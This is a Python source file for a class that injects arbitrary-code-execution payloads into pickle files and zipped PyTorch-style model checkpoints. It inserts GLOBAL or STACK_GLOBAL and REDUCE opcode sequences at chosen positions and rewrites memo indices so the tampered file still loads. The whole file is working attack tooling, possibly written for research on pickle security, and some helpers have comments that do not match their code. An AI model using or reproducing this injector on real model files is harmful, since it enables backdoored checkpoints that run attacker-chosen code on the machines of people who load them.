import os
import shutil
import struct
from pickletools import genops
from pickletools import opcodes as opcode_library
from tempfile import NamedTemporaryFile

# Opcode indices within opcode_library used while injecting attacks
SHORT_BINUNICODE = 20
BINUNICODE = 21
TUPLE1 = 31
POP = 41
BINGET = 46
LONG_BINGET = 47
BINPUT = 49
LONG_BINPUT = 50
MEMOIZE = 51
GLOBAL = 55
STACK_GLOBAL = 56
REDUCE = 57
EVAL_EXEC_MEMO_LEN = 4
GLOBAL_END = b"\x0A"
BYTE_MAX = 0xFF
ZIP_PICKLE = "archive/data.pkl"

class AttackInjector():
    def __init__(self, bin_io):
        self.bin_io = bin_io

    @staticmethod
    def write_global(last_memo_index, out_pickle, module_str):
        """
        Params: 
            last_memo_index: Index that will be written as part of get command
            out_pickle: File object that will be written to
            module_str: String containing information about the module we're injecting

        Returns:
            Memo offset
        
        Writes a GLOBAL command to a pickle file assuming file cursor is at right place.
        """
        out_pickle.write(opcode_library[GLOBAL].code.encode('raw_unicode_escape'))
        out_pickle.write(module_str.encode('raw_unicode_escape'))
        out_pickle.write(GLOBAL_END)
        
        return 0

    @staticmethod
    def write_get(last_memo_index, out_pickle):
        """
        Params: 
            last_memo_index: Index that will be written as part of get command
            out_pickle: File object that will be written to
            memo_ind: What index to use for get command

        Returns:
            Memo offset
        
        Writes a BINGET or LONG_BINGET command to a pickle file assuming file cursor is at right place.
        """
        memo_opcode = BINGET if last_memo_index <= BYTE_MAX else LONG_BINGET
        byte_length = 1 if last_memo_index <= BYTE_MAX else 4
        
        out_pickle.write(opcode_library[memo_opcode].code.encode('raw_unicode_escape'))
        out_pickle.write(last_memo_index.to_bytes(byte_length, byteorder="little"))

        return 1

    @staticmethod
    def write_put(last_memo_index, out_pickle):
        """
        Params: 
            memo_index: Index that will be written as part of put command
            out_pickle: File object that will be written to

        Returns:
            Memo offset
        
        Writes a BINPUT or LONG_BINPUT command to a pickle file assuming file cursor is at right place.
        """
        memo_opcode = BINPUT if last_memo_index <= BYTE_MAX else LONG_BINPUT
        byte_length = 1 if last_memo_index <= BYTE_MAX else 4
        
        out_pickle.write(opcode_library[memo_opcode].code.encode('raw_unicode_escape'))
        out_pickle.write(last_memo_index.to_bytes(byte_length, byteorder="little"))

        return 1
    
    @staticmethod
    def write_binunicode(last_memo_index, out_pickle, unicode_str):
        """
        Params: 
            last_memo_index: Index that will be written as part of get command
            out_pickle: File object that will be written to
            unicode_str: String to write

        Returns:
            Memo offset
        
        Writes a BINUNICODE command to a pickle file assuming file cursor is at right place.
        """
        attack_bytes = unicode_str.encode('raw_unicode_escape')
        out_pickle.write(opcode_library[BINUNICODE].code.encode('raw_unicode_escape'))
        out_pickle.write(struct.pack("<L", len(attack_bytes)))
        out_pickle.write(attack_bytes)

        return 0

    @staticmethod
    def write_short_binunicode(last_memo_index, out_pickle, unicode_str):
        """
        Params: 
            last_memo_index: Index that will be written as part of get command
            out_pickle: File object that will be written to
            unicode_str: String to write

        Returns:
            Memo offset
        
        Writes a BINUNICODE command to a pickle file assuming file cursor is at right place.
        """
        attack_bytes = unicode_str.encode('raw_unicode_escape')
        out_pickle.write(opcode_library[SHORT_BINUNICODE].code.encode('raw_unicode_escape'))
        out_pickle.write(struct.pack("<b", len(attack_bytes)))
        out_pickle.write(attack_bytes)

        return 0

    @staticmethod
    def write_simple_opcode(last_memo_index, out_pickle, opcode_lib_ind):
        """
        Params: 
            last_memo_index: Index that will be written as part of get command
            out_pickle: File object that will be written to
            opcode_lib_ind: Index in opcode library to use

        Returns:
            Memo offset
        
        Writes an arbitrary PVM command that is only an opcode to a pickle file assuming file cursor is at right place.
        """
        out_pickle.write(opcode_library[opcode_lib_ind].code.encode('raw_unicode_escape'))

        return 0

    @staticmethod
    def memo_inject_attack(last_memo_index, out_pickle, module_str):
        AttackInjector.write_global(None, out_pickle, module_str)    # GLOBAL     <module_str>
        AttackInjector.write_put(last_memo_index + 1, out_pickle)    # BINPUT/LONG_BINPUT     N + 1
        AttackInjector.write_simple_opcode(None, out_pickle, POP)    # POP

        return 1
    
    @staticmethod
    def sequential_module_attack_with_memo(last_memo_index, out_pickle, module_str, arg_str):
        AttackInjector.write_global(None, out_pickle, module_str)    # GLOBAL                 <module_str>
        AttackInjector.write_put(last_memo_index + 1, out_pickle)    # BINPUT/LONG_BINPUT     N + 1
        AttackInjector.write_binunicode(None, out_pickle, arg_str)   # BINUNICODE             <arg_str>
        AttackInjector.write_put(last_memo_index + 2, out_pickle)    # BINPUT/LONG_BINPUT     N + 2
        AttackInjector.write_simple_opcode(None, out_pickle, TUPLE1) # TUPLE1
        AttackInjector.write_put(last_memo_index + 3, out_pickle)    # BINPUT/LONG_BINPUT     N + 3
        AttackInjector.write_simple_opcode(None, out_pickle, REDUCE) # REDUCE
        AttackInjector.write_put(last_memo_index + 4, out_pickle)    # BINPUT/LONG_BINPUT     N + 4
        AttackInjector.write_simple_opcode(None, out_pickle, POP)    # POP

        return 4

    @staticmethod
    def sequential_module_attack_without_memo(last_memo_index, out_pickle, module_str, arg_str):
        AttackInjector.write_global(None, out_pickle, module_str)    # GLOBAL         <module_str>
        AttackInjector.write_binunicode(None, out_pickle, arg_str)   # BINUNICODE     <arg_str>
        AttackInjector.write_simple_opcode(None, out_pickle, TUPLE1) # TUPLE1
        AttackInjector.write_simple_opcode(None, out_pickle, REDUCE) # REDUCE
        AttackInjector.write_simple_opcode(None, out_pickle, POP)    # POP

        return 0
    
    @staticmethod
    def module_attack_using_memo(last_memo_index, out_pickle, memo_ind, arg_str):
        AttackInjector.write_get(memo_ind, out_pickle)                         # BINGET/LONG_BINGET     N + 2
        AttackInjector.write_binunicode(None, out_pickle, arg_str)             # BINUNICODE             <arg_str>
        AttackInjector.write_simple_opcode(None, out_pickle, TUPLE1)           # TUPLE1
        AttackInjector.write_simple_opcode(None, out_pickle, REDUCE)           # REDUCE
        AttackInjector.write_simple_opcode(None, out_pickle, POP)              # POP

        return 0

    @staticmethod
    def memo_inject_attack_proto_4(last_memo_index, out_pickle, module_name, qualname):
        AttackInjector.write_binunicode(None, out_pickle, module_name)            # SHORT_BINUNICODE       <module_name>
        AttackInjector.write_binunicode(None, out_pickle, qualname)               # SHORT_BINUNICODE       <module_name>
        AttackInjector.write_simple_opcode(None, out_pickle, STACK_GLOBAL)        # STACK_GLOBAL
        AttackInjector.write_simple_opcode(None, out_pickle, MEMOIZE)             # MEMOIZE
        AttackInjector.write_simple_opcode(None, out_pickle, POP)                 # POP

        return 1
    
    @staticmethod
    def sequential_module_attack_with_memo_proto_4(last_memo_index, out_pickle, module_name, qualname, arg_str):
        AttackInjector.write_binunicode(None, out_pickle, module_name)            # SHORT_BINUNICODE       <module_name>
        AttackInjector.write_binunicode(None, out_pickle, qualname)               # SHORT_BINUNICODE       <module_name>
        AttackInjector.write_simple_opcode(None, out_pickle, STACK_GLOBAL)        # STACK_GLOBAL
        AttackInjector.write_simple_opcode(None, out_pickle, MEMOIZE)             # MEMOIZE
        AttackInjector.write_binunicode(None, out_pickle, arg_str)                # BINUNICODE             <arg_str>
        AttackInjector.write_simple_opcode(None, out_pickle, MEMOIZE)             # MEMOIZE
        AttackInjector.write_simple_opcode(None, out_pickle, TUPLE1)              # TUPLE1
        AttackInjector.write_simple_opcode(None, out_pickle, MEMOIZE)             # MEMOIZE
        AttackInjector.write_simple_opcode(None, out_pickle, REDUCE)              # REDUCE
        AttackInjector.write_simple_opcode(None, out_pickle, MEMOIZE)             # MEMOIZE
        AttackInjector.write_simple_opcode(None, out_pickle, POP)                 # POP

        return 4

    @staticmethod
    def sequential_module_attack_without_memo_proto_4(last_memo_index, out_pickle, module_name, qualname, arg_str):
        AttackInjector.write_binunicode(None, out_pickle, module_name)            # SHORT_BINUNICODE       <module_name>
        AttackInjector.write_binunicode(None, out_pickle, qualname)               # SHORT_BINUNICODE       <module_name>
        AttackInjector.write_simple_opcode(None, out_pickle, STACK_GLOBAL)        # STACK_GLOBAL
        AttackInjector.write_binunicode(None, out_pickle, arg_str)                # BINUNICODE     <arg_str>
        AttackInjector.write_simple_opcode(None, out_pickle, TUPLE1)              # TUPLE1
        AttackInjector.write_simple_opcode(None, out_pickle, REDUCE)              # REDUCE
        AttackInjector.write_simple_opcode(None, out_pickle, POP)                 # POP

        return 0

    def _get_all_commands(self, in_pickle):
        """
        Params: 
            in_pickle: bytes object containing pickle file

        Returns:
            opcodes: List of opcodes used
            args: List of arguments for opcodes used
            positions: Starting byte position in pickle file for each command
        
        Gets all commands used wihin a pickle file.
        """
        opcodes = []
        args = []
        positions = []

        for opcode, arg, pos in genops(in_pickle):
            opcodes.append(opcode)
            args.append(arg)
            positions.append(pos)

        return opcodes, args, positions

    def _get_last_memo_index(self, attack_index, opcodes, args):
        """
        Params: 
            attack_index: Index we're attack at
            opcodes: Opcodes of each commmand
            args: Arguments of each command

        Returns:
            last_memo_index: Index of the last (LONG_)BINPUT command used
        
        Gets the index of the last (LONG_)BINPUT command used up until the attack index
        """
        last_memo_index = -1
        for i in range(attack_index):
            if opcodes[i].name == "BINPUT" or opcodes[i].name == "LONG_BINPUT":
                last_memo_index = args[i]

        return last_memo_index

    def _increment_memo_args(self, start_index, last_memo_index, memo_offset, opcodes, args):
        """
        Params: 
            attack_index: Index we're starting our incrementation by
            opcodes: Opcodes of each commmand
            args: Arguments of each command

        Returns:
            incremented_memo_record: Whether the memo recrod was incremented or not
        
        Gets the index of the last (LONG_)BINPUT command used up until the attack index
        """
        # Increment the remaining memo records
        incremented_memo_record = False
        for i in range(start_index, len(opcodes)):
            opcode_is_memo = opcodes[i].name == "BINPUT" or opcodes[i].name == "LONG_BINPUT"
            opcode_is_get = opcodes[i].name == "BINGET" or opcodes[i].name == "LONG_BINGET"

            if (opcode_is_memo or opcode_is_get) and args[i] > last_memo_index:
                incremented_memo_record = True
                args[i] += memo_offset
        
        return incremented_memo_record
    
    def _reconstruct_pickle(self, attack_index, end_index, uses_memo, last_memo_index, in_pickle, out_pickle, opcodes, args, pos):
        """
        Reconstructs the end of a pickle file which has been modified.
        """
        # Define where we attacked byte-wise
        attack_pos = pos[attack_index]

        if uses_memo:
            rem_opcodes = opcodes[attack_index:end_index]
            rem_args = args[attack_index:end_index]
            rem_pos = pos[attack_index:end_index]

            for i in range(len(rem_opcodes)):
                opcode_is_memo = rem_opcodes[i].name == "BINPUT" or rem_opcodes[i].name == "LONG_BINPUT"
                opcode_is_get = rem_opcodes[i].name == "BINGET" or rem_opcodes[i].name == "LONG_BINGET"

                if opcode_is_get and rem_args[i] > last_memo_index:
                    # Rewrite get
                    AttackInjector.write_get(rem_args[i], out_pickle)
                elif opcode_is_memo:
                    # Rewrite memo
                    AttackInjector.write_put(rem_args[i], out_pickle)
                else:
                    # If this opcode is not special, just copy data from pickle file
                    in_pickle.seek(rem_pos[i])
                    bytes_read = rem_pos[i + 1] - rem_pos[i] if i != len(rem_opcodes) - 1 else 1
                    out_pickle.write(in_pickle.read(bytes_read))
        else:
            # Trivial case: no memoization, no modification
            in_pickle.seek(attack_pos)
            out_pickle.write(in_pickle.read())


    def _inject_attacks(self, attacks, attack_indices, attack_args, in_pickle, out_pickle):
        """
        Injects a list of attacks into pickle file
        """
        # First, extract every command from the pickle file
        opcodes, args, pos = self._get_all_commands(in_pickle)

        seek_index = 0
        memo_offset = 0
        last_memo_index = -1
        last_attack_pos = None
        incremented_memo_args = False
        memo_mod_start = []
        for i in range(len(attacks)):
            # Define a few variables
            attack = attacks[i]
            attack_index = attack_indices[i]
            attack_arg = attack_args[i]

            # Find what memo record, if any, we left off on
            last_memo_index = self._get_last_memo_index(attack_index, opcodes, args) + memo_offset

            # Next, copy everything from the previous pickle file into a new file
            attack_pos = pos[attack_index]
            in_pickle.seek(seek_index)
            out_pickle.write(in_pickle.read(attack_pos))

            # Inject our attack and record how long it was in the PVM memo record
            attack_memo_len = attack(last_memo_index, out_pickle, *attack_arg)

            # Update our seek index and memo offset
            seek_index = attack_pos
            memo_offset += attack_memo_len

            # Increment the remaining memo records
            incremented_memo_args = self._increment_memo_args(attack_index, last_memo_index, memo_offset, opcodes, args)

            # Record the start of each memo modification
            if attack_memo_len > 0:
                memo_mod_start.append(last_memo_index + 1)
            else:
                memo_mod_start.append(None)

            # Reconstruct any commands we skipped over or the rest of the pickle file
            next_attack_index = attack_indices[i + 1] if i + 1 < len(attacks) else len(opcodes) + 1
            self._reconstruct_pickle(
                attack_index,
                next_attack_index,
                incremented_memo_args,
                last_memo_index,
                in_pickle,
                out_pickle,
                opcodes,
                args,
                pos
            )

        return memo_mod_start

    def inject_attacks_pickle(self, attacks, attack_indices, attack_args, in_pickle_name, out_pickle_name):
        # Open both of our pickle files
        in_pickle = open(in_pickle_name, "rb")
        out_pickle_temp = NamedTemporaryFile()
        out_pickle_write = open(out_pickle_temp.name, "wb")

        # Injection time (modifies out_pickle)
        memo_mod_start = self._inject_attacks(
            attacks,
            attack_indices,
            attack_args,
            in_pickle,
            out_pickle_write
        )

        # Close opened files
        in_pickle.close()
        out_pickle_write.close()

        # Using temp, copy into final destination
        out_pickle = open(out_pickle_name, "wb")
        out_pickle_read = open(out_pickle_temp.name, "rb")
        shutil.copyfileobj(out_pickle_read, out_pickle)
        out_pickle.close()
        out_pickle_read.close()

        return memo_mod_start

    def inject_attacks_bin(self, attacks, attack_indices, attack_args, in_bin_dir, out_bin_dir):
        # Extract our bin file so we can manipulate its contents
        bin_filename = os.path.basename(in_bin_dir)
        bin_dirname = os.path.dirname(in_bin_dir)
        file_type = self.bin_io.extract(bin_dirname, bin_filename)

        # Proceed to open pickle file of extracted bin and set up temp in pickle
        if file_type == "zip":
            in_pickle = open(f"{bin_dirname}/{ZIP_PICKLE}", "rb")
        else:
            in_pickle = None
        out_pickle_temp = NamedTemporaryFile()

        # Injection time (modifies out_pickle)
        out_pickle_write = open(out_pickle_temp.name, "wb")
        memo_mod_start = self._inject_attacks(
            attacks,
            attack_indices,
            attack_args,
            in_pickle,
            out_pickle_write
        )

        # Inject modified pickle file into bin and create modified bin
        in_pickle.close()
        out_pickle_write.close()
        out_pickle_read = open(out_pickle_temp.name, "rb")
        self.bin_io.inject_pickle_and_compress(
            bin_dirname,
            file_type,
            out_pickle_read,
            out_bin_dir
        )
        shutil.rmtree(f"{bin_dirname}/archive") # Remove working dir

        return memo_mod_start
